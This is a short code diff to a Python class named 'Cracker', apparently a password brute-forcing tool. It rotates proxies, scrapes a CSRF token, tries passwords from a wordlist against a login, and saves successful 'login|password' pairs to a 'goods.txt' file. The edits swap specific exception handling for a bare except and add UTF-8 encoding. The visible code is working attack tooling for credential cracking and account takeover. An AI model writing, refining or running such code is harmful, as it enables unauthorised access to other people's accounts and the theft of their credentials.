@@ -29,11 +29,7 @@ class Cracker:
             csrf = csrf.split('"')
             csrf = csrf[1].replace('"','')
             self.auth(r,csrf,prox,login,passwords,startpoint,endpoint)
-        except exceptions.Timeout as e:
-            time.sleep(1)
-            print('Hmmm. Looks like bad proxy: ' + prox + ' I\'ll repair it.')
-            self.session_get(proxy,login,passwords,startpoint,endpoint)
-        except exceptions.ProxyError:
+        except:
             time.sleep(1)
             print('Hmmm. Looks like bad proxy: ' + prox + ' I\'ll repair it.')
             self.session_get(proxy,login,passwords,startpoint,endpoint)
@@ -41,7 +37,7 @@ class Cracker:
         global last_password
         global gproxy
         global counter
-        f = open(passwords,'r')
+        f = open(passwords,'r',encoding='utf-8')
         password = f.readline()
         if counter < startpoint:
             while counter != startpoint:
@@ -63,7 +59,7 @@ class Cracker:
                     except:
                         pass
                     try:
-                        f = open('./workout/goods.txt','a')
+                        f = open('./workout/goods.txt','a', encoding='utf-8')
                         f.write('Good: '+login + "|"+password+'\n')
                         f.close()
                     except:
